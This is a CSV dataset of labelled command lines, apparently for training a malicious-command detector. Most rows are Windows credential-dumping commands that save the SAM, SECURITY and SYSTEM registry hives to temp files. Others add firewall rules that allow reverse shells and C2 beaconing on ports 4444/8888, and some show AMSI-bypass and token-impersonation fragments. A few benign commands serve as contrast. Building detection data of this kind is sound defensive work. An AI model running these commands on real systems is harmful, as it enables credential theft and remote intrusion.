text,label
"cmd.exe   /c   ""reg   export   hklm\security   c:\temp\fty1o4pw.dat""",1
reg export hklm\sam c:\windows\temp\q30jl3nb.save,1
reg export hklm\security c:\windows\temp\rnqlibvy.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\cb0r37ng.dat""",1
"powershell  -nop  -c  ""reg  save  hklm\security  c:\temp\isqbnxgu.dat""",1
reg save hklm\security c:\windows\temp\tfp8kz8f.save,1
reg save hklm\security c:\windows\temp\h25nn79e.save,1
reg save hklm\sam c:\windows\temp\49bqtnda.save,1
"cmd.exe /c ""cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\1phynq1k.dat""""",1
reg export hklm\security c:\windows\temp\f2ojdikn.save,1
"cmd.exe /c ""rule:   c2   beacon   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
reg save hklm\sam c:\windows\temp\rywehwzn.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\uvwyng6y.dat""",1
"cmd.exe /c ""powershell   -nop   -c   ""reg   export   hklm\sam   c:\temp\wym4fktc.dat""""",1
get-help adjusttokenprivileges -full,0
reg save hklm\sam c:\windows\temp\mim56v2z.save,1
reg save hklm\security c:\windows\temp\ubpcb4dn.save,1
reg export hklm\system c:\windows\temp\exnhah0x.save,1
reg export hklm\sam c:\windows\temp\7fqkndsz.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\swhdzfhl.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\wdwh6o2e.dat""",1
rule:   reverse   shell   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888,2
"powershell -nop -c ""reg export hklm\sam c:\temp\sk6mtg0b.dat""",1
reg save hklm\security c:\windows\temp\r8nbnoah.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\4abeacvt.dat""",1
"powershell -nop -c ""rule:   exfil   data   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
"powershell -nop -c ""reg save hklm\sam c:\temp\4jzrdvlc.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\t60b4n1l.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\qws3uf8h.dat""",1
reg save hklm\security c:\windows\temp\md6covmw.save,1
"powershell -nop -c ""backup-utility   save   registry   config""",0
"powershell -nop -c ""reg save hklm\sam c:\temp\gyd8mz4r.dat""",1
"cmd.exe  /c  ""reg  export  hklm\security  c:\temp\nbzle1t5.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\bic1ha2o.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\windows\temp\9dmqun6z.save""",1
reg save hklm\sam c:\windows\temp\96616fou.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\zaf2kfgd.dat""",1
sc  query  windefend,0
"powershell -nop -c ""reg save hklm\security c:\temp\yiqeyd73.dat""",1
reg save hklm\system c:\windows\temp\avc91xon.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\1fb87mfw.dat""",1
reg save hklm\sam c:\windows\temp\twc7guef.save,1
reg  export  hklm\sam  c:\windows\temp\42pwxb31.save,1
"cmd.exe  /c  ""reg  export  hklm\security  c:\temp\637krnaf.dat""",1
reg save hklm\system c:\windows\temp\etqf7gt9.save,1
reg save hklm\sam c:\windows\temp\2we3yo4g.save,1
reg save hklm\security c:\windows\temp\1a30xxmk.save,1
reg export hklm\security c:\windows\temp\19albyw3.save,1
reg save hklm\sam c:\windows\temp\otwq66ys.save,1
reg export hklm\sam c:\windows\temp\um295ol8.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\khp4ne7b.dat""",1
"cmd.exe /c ""klist   purge""",3
reg save hklm\sam c:\windows\temp\2eyvdv7j.save,1
reg export hklm\system c:\windows\temp\osm9miee.save,1
reg export hklm\security c:\windows\temp\kwl99pz2.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\h6pwx4lm.dat""",1
reg save hklm\sam c:\windows\temp\abx239h5.save,1
reg export hklm\system c:\windows\temp\mbqx56fz.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\x4ua67sr.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\jses9neu.dat""",1
reg save hklm\system c:\windows\temp\mi5ecxu6.save,1
"cmd.exe /c ""$a  =  [ref].assembly.gettype('system.management.automation.openprocesstoken')""",3
reg export hklm\sam c:\windows\temp\hj3dm2v5.save,1
reg save hklm\security c:\windows\temp\n9ygmjxg.save,1
reg export hklm\system c:\windows\temp\r6x31i74.save,1
reg export hklm\security c:\windows\temp\rz573fbe.save,1
reg  export  hklm\system  c:\windows\temp\nrioiaan.save,1
reg export hklm\security c:\windows\temp\j4tlwe2z.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\l9e3ylw2.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\ywlpcq65.dat""",1
reg save hklm\system c:\windows\temp\3a32oo30.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\lka7jixo.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\fbg39ak0.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\719atf36.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\6q71fump.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\kjxvr2yu.dat""",1
reg export hklm\sam c:\windows\temp\nfix74e1.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\qhrvbwcl.dat""",1
reg save hklm\sam c:\windows\temp\a3759d60.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\f1nya92p.dat""",1
"powershell -nop -c ""cmd.exe   /c   ""reg   save   hklm\sam   c:\temp\60vjb9yk.dat""""",1
"cmd.exe   /c   ""reg   save   hklm\sam   c:\temp\p753eugc.dat""",1
node server.js --port 3000,0
"powershell -nop -c ""reg save hklm\security c:\temp\0rlkqmab.dat""",1
reg  export  hklm\system  c:\windows\temp\2gqby3ec.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\ed9pu4ei.dat""",1
"powershell -nop -c ""node  server.js  --port  3000""",0
reg export hklm\security c:\windows\temp\5nmrqwcx.save,1
"cmd.exe /c ""$a = [ref].assembly.gettype('system.management.automation.impersonateloggedonuser')""",3
"cmd.exe /c ""reg export hklm\security c:\temp\obn7cryb.dat""",1
reg save hklm\security c:\windows\temp\b3sgr29x.save,1
reg save hklm\security c:\windows\temp\2qz0w2jf.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\ks4gxdn1.dat""",1
reg save hklm\sam c:\windows\temp\pizipgmr.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\k8erbk4x.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\4hohk59b.dat""",1
reg save hklm\system c:\windows\temp\6xqjz7aq.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\8sspqrum.dat""",1
reg   save   hklm\security   c:\windows\temp\e8gw381s.save,1
"[dllimport(""advapi32.dll"")]   extern   bool   amsiutils(...)",3
"cmd.exe /c ""reg save hklm\security c:\temp\34ctbh8b.dat""",1
reg export hklm\security c:\windows\temp\76k98qnb.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\s4rrnhgf.dat""",1
reg export hklm\security c:\windows\temp\5jlkgirw.save,1
rule:   c2   beacon   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888,2
reg save hklm\sam c:\windows\temp\j52tz2ed.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\l0oijon4.dat""",1
reg export hklm\security c:\windows\temp\bkbivubp.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\b4ysljfd.dat""",1
"powershell -nop -c ""powershell  -nop  -c  ""reg  save  hklm\sam  c:\temp\erwh5i5o.dat""""",1
reg save hklm\security c:\windows\temp\o4f2ynfo.save,1
reg export hklm\security c:\windows\temp\16mz9fy6.save,1
"powershell -nop -c ""powershell -nop -c ""reg export hklm\sam c:\temp\5cfxj3n2.dat""""",1
reg export hklm\security c:\windows\temp\ju8whlnl.save,1
"powershell -nop -c ""$a  =  [ref].assembly.gettype('system.management.automation.duplicatetokenex')""",3
"cmd.exe /c ""reg save hklm\security c:\temp\6t9uho2f.dat""",1
reg save hklm\security c:\windows\temp\jf09oc9u.save,1
reg export hklm\system c:\windows\temp\mxnq89m7.save,1
reg save hklm\security c:\windows\temp\ps5n9xo2.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\l9eq01wq.dat""",1
"cmd.exe /c ""reg  export  hklm\sam  c:\windows\temp\q3gaaw0e.save""",1
reg export hklm\sam c:\windows\temp\qvjq7um2.save,1
klist  purge,3
reg export hklm\sam c:\windows\temp\ullnehzx.save,1
"powershell -nop -c ""netsh   advfirewall   firewall   add   rule   name=""bad""   action=allow   protocol=any   port=4444""",2
"powershell -nop -c ""reg export hklm\sam c:\temp\zl73r07m.dat""",1
"cmd.exe  /c  ""reg  save  hklm\security  c:\temp\zt8t8vky.dat""",1
reg export hklm\system c:\windows\temp\byefzy80.save,1
reg save hklm\sam c:\windows\temp\o07vdhea.save,1
"powershell   -nop   -c   ""reg   save   hklm\sam   c:\temp\h293it55.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\windows\temp\o48xkf57.save""",1
reg save hklm\sam c:\windows\temp\vjiqioze.save,1
"powershell -nop -c ""ipconfig  /all""",0
"cmd.exe /c ""reg save hklm\sam c:\temp\qqq5y252.dat""",1
reg export hklm\sam c:\windows\temp\tr2essbc.save,1
reg export hklm\security c:\windows\temp\ljpjbjkd.save,1
reg export hklm\security c:\windows\temp\akwhj35w.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\j7b45gaf.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\pikd6s7r.dat""",1
reg save hklm\security c:\windows\temp\tc37qcvn.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\qm5qtfvt.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\tx7u04hk.dat""",1
java  -jar  application.jar,0
"powershell -nop -c ""reg export hklm\sam c:\temp\n2z2ihef.dat""",1
reg save hklm\sam c:\windows\temp\k1nc3k3i.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\99zrrsrf.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\3q46nl0t.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\9g8ckli6.dat""",1
"netsh advfirewall firewall add rule name=""bad"" action=allow protocol=any port=4444",2
reg save hklm\system c:\windows\temp\xr6d8yg2.save,1
reg export hklm\security c:\windows\temp\5pig4ilm.save,1
reg export hklm\sam c:\windows\temp\p5kio1n5.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\vk9j6734.dat""",1
reg save hklm\security c:\windows\temp\00gqqu3y.save,1
reg save hklm\system c:\windows\temp\amjn6fg0.save,1
reg save hklm\system c:\windows\temp\3pembgeh.save,1
reg save hklm\security c:\windows\temp\gwd6ptdx.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\9dccjzhq.dat""",1
reg save hklm\security c:\windows\temp\kbuucjc7.save,1
reg save hklm\sam c:\windows\temp\xvc7ty27.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\p0hiwdmz.dat""",1
"powershell -nop -c ""select-string  -path  c:\logs\app.log  -pattern  'failed  logon'""",0
reg save hklm\security c:\windows\temp\nwwzdl9x.save,1
reg save hklm\sam c:\windows\temp\23xtg2x3.save,1
"cmd.exe /c ""reg export hklm\sam c:\windows\temp\lvb1xbyd.save""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\xggkjm7w.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\gkbmxlun.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\fxsq9lao.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\zhltv5nz.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\zmy7arcc.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\me855ukg.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\5623x5q2.dat""",1
reg export hklm\sam c:\windows\temp\wnrs9jt9.save,1
reg save hklm\sam c:\windows\temp\906iho62.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\2cep9uet.dat""",1
reg save hklm\security c:\windows\temp\ka09htkf.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\ekasq9cp.dat""",1
reg   export   hklm\system   c:\windows\temp\t237hqu5.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\a3mt9dpc.dat""",1
reg export hklm\system c:\windows\temp\o78w3zwe.save,1
reg export hklm\security c:\windows\temp\hm08599t.save,1
reg export hklm\system c:\windows\temp\uwhr2tj7.save,1
reg export hklm\sam c:\windows\temp\d605htm4.save,1
reg export hklm\system c:\windows\temp\b9ki5rco.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\f204ys23.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\4hf9mpt2.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\z1p8q57a.dat""",1
$a  =  [ref].assembly.gettype('system.management.automation.duplicatetokenex'),3
"cmd.exe /c ""reg save hklm\security c:\temp\6rwwl3sy.dat""",1
reg save hklm\system c:\windows\temp\vx6weyow.save,1
reg export hklm\security c:\windows\temp\0peiy8x8.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\kfcsbmp5.dat""",1
"cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\bm7ji88l.dat""",1
rule:  c2  beacon  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888,2
"cmd.exe /c ""reg save hklm\security c:\temp\ofqgloh5.dat""",1
reg save hklm\system c:\windows\temp\eg49isnn.save,1
reg save hklm\system c:\windows\temp\v18by68u.save,1
"cmd.exe   /c   ""reg   save   hklm\sam   c:\temp\pefg0f3a.dat""",1
reg export hklm\sam c:\windows\temp\l94sqle0.save,1
reg save hklm\sam c:\windows\temp\iw3xg81f.save,1
reg   export   hklm\system   c:\windows\temp\gqked6v3.save,1
rule: reverse shell | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: tcp 8888,2
reg save hklm\system c:\windows\temp\p2rqn7ij.save,1
"cmd.exe /c ""reg  export  hklm\system  c:\windows\temp\tnzfpajy.save""",1
reg save hklm\sam c:\windows\temp\24ccb238.save,1
reg export hklm\system c:\windows\temp\x3a45rdu.save,1
reg export hklm\security c:\windows\temp\8ds6h4lk.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\h5o0x6q8.dat""",1
"powershell -nop -c ""rule:  exfil  data  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888""",2
"powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\ckk0pi1g.dat""",1
reg save hklm\system c:\windows\temp\oxisfe7w.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\jqh05m8a.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\pdlwqj4x.dat""",1
reg export hklm\system c:\windows\temp\i1x996lv.save,1
"cmd.exe /c ""reg   export   hklm\system   c:\windows\temp\eflkz4xj.save""",1
reg export hklm\sam c:\windows\temp\sde8z7r7.save,1
"cmd.exe /c ""reg save hklm\system c:\windows\temp\yykvz6q2.save""",1
reg export hklm\security c:\windows\temp\j6hrs5x1.save,1
reg   export   hklm\sam   c:\windows\temp\2dhxku7h.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\ndnjxr5k.dat""",1
reg export hklm\security c:\windows\temp\mzzneww1.save,1
reg export hklm\sam c:\windows\temp\g0zzvc0k.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\vch18gyu.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\windows\temp\50qp6naz.save""",1
"powershell -nop -c ""reg save hklm\security c:\temp\z7r11y0r.dat""",1
"cmd.exe /c ""$a = [ref].assembly.gettype('system.management.automation.amsiutils')""",3
